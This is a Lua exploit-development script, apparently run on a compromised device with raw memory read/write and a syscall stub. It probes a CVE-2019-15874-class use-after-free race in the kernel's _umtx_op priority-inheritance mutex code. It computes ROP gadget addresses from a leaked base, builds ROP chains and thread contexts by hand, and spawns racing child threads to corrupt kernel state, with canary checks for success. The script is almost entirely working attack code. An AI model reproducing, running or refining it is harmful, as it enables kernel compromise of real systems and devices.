-- CRASH_CLASS: HIGH
-- PROBE 95a: UMTX op survey + PI-mutex race
--
-- CVE-2019-15874 class: PI-mutex lock/unlock races umtx_pi refcount.
-- When contested MUTEX_LOCK allocates umtx_pi and a concurrent UNLOCK
-- frees it, the lookup-vs-free window is a UAF.
--
-- A) Survey: all ops 0-26 on syscall 454, rv + VM delta
-- B) Gate: PI-mutex lock/unlock from main thread
-- C) PI-mutex race: 8 children loop lock/unlock on same PI mutex
-- D) Post-race diagnostics: mutex state, canary, VM delta

print("=== PROBE 95a: UMTX PI-MUTEX RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=50
local STK_PG=2
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl2=R+0x20; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000))
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl20=R+0x60; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local sl50=R+0x80; wq(sl50,uint64(0)); wq(sl50+8,uint64(50000000))
local tb=R+0xA0

-- Survey object buffer (256 bytes, zeroed per op)
local srv_obj=R+0x100

-- PI mutex: struct umutex at R+0x200
-- +0x00: m_owner (4B), +0x04: m_flags (4B), +0x08: m_ceilings (8B)
local pi_mtx=R+0x200
-- Standard mutex at R+0x220
local std_mtx=R+0x220

-- ============================================================
-- A: SURVEY — all ops 0-26
-- ============================================================
print("--- A: UMTX OP SURVEY (syscall 454) ---")

local OP_NAMES={
    [0]="LOCK(dep)",[1]="UNLOCK(dep)",[2]="WAIT",[3]="WAKE",
    [4]="MTX_TRY",[5]="MTX_LOCK",[6]="MTX_UNLOCK",[7]="SET_CEIL",
    [8]="CV_WAIT",[9]="CV_SIG",[10]="CV_BCAST",[11]="WAIT_UINT",
    [12]="RW_RD",[13]="RW_WR",[14]="RW_UNLOCK",[15]="WAIT_PRIV",
    [16]="WAKE_PRIV",[17]="MTX_WAIT",[18]="MTX_WAKE",[19]="SEM_WAIT",
    [20]="SEM_WAKE",[21]="NWAKE_PRIV",[22]="MTX_WAKE2",[23]="SEM2_WAIT",
    [24]="SEM2_WAKE",[25]="SHM",[26]="ROBUST"
}

for op=0,26 do
    -- Skip ops that block on zeroed struct (19=SEM_WAIT, 23=SEM2_WAIT, 24=SEM2_WAKE)
    -- and ops already confirmed in prior probes (25=SHM stubbed, 26=ROBUST untested)
    if op>=19 and op~=20 and op~=21 and op~=22 then
        print(string.format("op %2d %-10s: SKIP", op, OP_NAMES[op] or "?"))
    else

    z(srv_obj, 0x100)
    -- val=1 for WAIT ops to avoid blocking (*obj=0 != 1 → EWOULDBLOCK)
    local val=0
    if op==2 or op==11 or op==15 then val=1 end

    local v0=vmc()
    local ok1,rv1=pcall(function()
        return sc_umtx(uint64(srv_obj),uint64(op),uint64(val),uint64(0),uint64(0))
    end)
    local v1=vmc()
    local r=ok1 and N(rv1) or -999
    local d=v1-v0
    local tag=""
    if r==0 then tag=" OK" end
    if r==-999 then tag=" CRASH" end
    if d>100 then tag=tag.." ***VM" end
    print(string.format("op %2d %-10s: rv=%-4d vmd=%-4d%s",
        op, OP_NAMES[op] or "?", r, d, tag))

    -- Clean up: unlock if we locked
    if (op==5 or op==12 or op==13) and r==0 then
        pcall(function()
            sc_umtx(uint64(srv_obj),uint64(op==5 and 6 or 14),uint64(0),uint64(0),uint64(0))
        end)
    end

    end -- else (skip guard)
end
print("canary="..N(native.fcall_with_rax(stub,20)))

-- ============================================================
-- B: PI-MUTEX GATE — verify lock/unlock works with PRIO_INHERIT
-- ============================================================
print("")
print("--- B: PI-MUTEX GATE ---")

-- Setup PI mutex
z(pi_mtx, 0x20)
wd(pi_mtx, 0)       -- m_owner = UMUTEX_UNOWNED
wd(pi_mtx+4, 4)     -- m_flags = UMUTEX_PRIO_INHERIT (0x0004)

-- Lock from main
local v0=vmc()
local ok_lk,rv_lk=pcall(function()
    return sc_umtx(uint64(pi_mtx),uint64(5),uint64(0),uint64(0),uint64(0))
end)
local v1=vmc()
local owner_after_lock=rd(pi_mtx) or 0
print(string.format("PI LOCK: rv=%s owner=0x%X vmd=%d",
    ok_lk and tostring(N(rv_lk)) or "FAIL", owner_after_lock, v1-v0))

-- Unlock from main
local ok_ul,rv_ul=pcall(function()
    return sc_umtx(uint64(pi_mtx),uint64(6),uint64(0),uint64(0),uint64(0))
end)
local v2=vmc()
local owner_after_unlock=rd(pi_mtx) or 0
print(string.format("PI UNLOCK: rv=%s owner=0x%X vmd=%d",
    ok_ul and tostring(N(rv_ul)) or "FAIL", owner_after_unlock, v2-v1))

-- Standard mutex comparison
z(std_mtx, 0x20)
wd(std_mtx, 0)
wd(std_mtx+4, 0)    -- flags=0 (no PI)

local ok_sl,rv_sl=pcall(function()
    return sc_umtx(uint64(std_mtx),uint64(5),uint64(0),uint64(0),uint64(0))
end)
local std_owner=rd(std_mtx) or 0
pcall(function()
    sc_umtx(uint64(std_mtx),uint64(6),uint64(0),uint64(0),uint64(0))
end)
print(string.format("STD LOCK: rv=%s owner=0x%X",
    ok_sl and tostring(N(rv_sl)) or "FAIL", std_owner))

if not ok_lk or N(rv_lk)~=0 then
    print("PI MUTEX NOT FUNCTIONAL — skipping race")
    print("=== 95a COMPLETE (no race) ===")
    return
end
print("gate OK")

-- ============================================================
-- C: PI-MUTEX RACE — children loop lock/unlock
-- ============================================================
print("")
print("--- C: PI-MUTEX RACE (8 children x 4 rounds) ---")

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

-- Spawn child that loops: MUTEX_LOCK(5) → MUTEX_UNLOCK(6) on given mutex
local function spawn_locker(mtx_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    -- ROP chain: alternating lock/unlock
    -- Initial context does first MUTEX_LOCK (RSI=5, RAX=454)
    -- Then chain: PRSI→6, PRAX→454, SA, PRSI→5, PRAX→454, SA, ...
    local off=0
    local ncycles=math.floor((stk_bytes-200)/80)
    for i=1,ncycles do
        -- unlock
        wq(stk+off,PRSI); off=off+8
        wq(stk+off,uint64(6)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(454)); off=off+8
        wq(stk+off,SA); off=off+8
        -- lock
        wq(stk+off,PRSI); off=off+8
        wq(stk+off,uint64(5)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(454)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    -- final unlock (leave mutex clean)
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
    wq(stk+off,SA); off=off+8
    -- nanosleep tail
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(454))       -- _umtx_op
    wq(ctx+_DI,uint64(mtx_addr))  -- obj = &umutex
    wq(ctx+_SI,uint64(5))         -- op = MUTEX_LOCK
    wq(ctx+_DX,uint64(0))         -- val = 0
    wq(ctx+_R10,uint64(0))        -- uaddr1 = NULL
    wq(ctx+_R8,uint64(0))         -- uaddr2 = NULL

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local hits_c=0
for round=1,4 do
    if cidx>=MAX_CH-8 then print("C: LIMIT") break end

    -- Fresh PI mutex each round
    z(pi_mtx, 0x20)
    wd(pi_mtx, 0)       -- unlocked
    wd(pi_mtx+4, 4)     -- PRIO_INHERIT

    local vm_before=vmc()

    -- Spawn 8 children — all race on same PI mutex
    for i=1,8 do spawn_locker(pi_mtx) end

    -- Wait for children to run their cycles
    native.fcall_with_rax(stub,240,sl50,0)  -- 50ms

    local vm_after=vmc()
    local owner=rd(pi_mtx) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local tag=""
    if c~=pid then hits_c=hits_c+1; tag=" !!CANARY" end
    if owner~=0 then tag=tag.." OWNER="..string.format("0x%X",owner) end

    print(string.format("C%d: canary=%d vmd=%d owner=0x%X ch=%d%s",
        round, c, vm_after-vm_before, owner, cidx, tag))

    -- If mutex stuck locked, force-clear for next round
    if owner~=0 then
        wd(pi_mtx, 0)
        pcall(function()
            sc_umtx(uint64(pi_mtx),uint64(18),uint64(0),uint64(0),uint64(0))
        end)
    end
end
print("C: hits="..hits_c)

-- ============================================================
-- D: STANDARD MUTEX RACE (comparison baseline)
-- ============================================================
print("")
print("--- D: STD MUTEX RACE (8 children x 2 rounds) ---")

local hits_d=0
for round=1,2 do
    if cidx>=MAX_CH-8 then print("D: LIMIT") break end

    z(std_mtx, 0x20)
    wd(std_mtx, 0)
    wd(std_mtx+4, 0)    -- no PI

    local vm_before=vmc()
    for i=1,8 do spawn_locker(std_mtx) end
    native.fcall_with_rax(stub,240,sl50,0)

    local vm_after=vmc()
    local owner=rd(std_mtx) or 0
    local c=N(native.fcall_with_rax(stub,20))

    local tag=""
    if c~=pid then hits_d=hits_d+1; tag=" !!CANARY" end
    if owner~=0 then tag=tag.." OWNER="..string.format("0x%X",owner) end

    print(string.format("D%d: canary=%d vmd=%d owner=0x%X ch=%d%s",
        round, c, vm_after-vm_before, owner, cidx, tag))

    if owner~=0 then
        wd(std_mtx, 0)
        pcall(function()
            sc_umtx(uint64(std_mtx),uint64(18),uint64(0),uint64(0),uint64(0))
        end)
    end
end
print("D: hits="..hits_d)

-- ============================================================
print("")
print(string.format("SUMMARY: C=%d D=%d ch=%d", hits_c, hits_d, cidx))
print("final canary="..N(native.fcall_with_rax(stub,20)))
print("=== 95a COMPLETE ===")
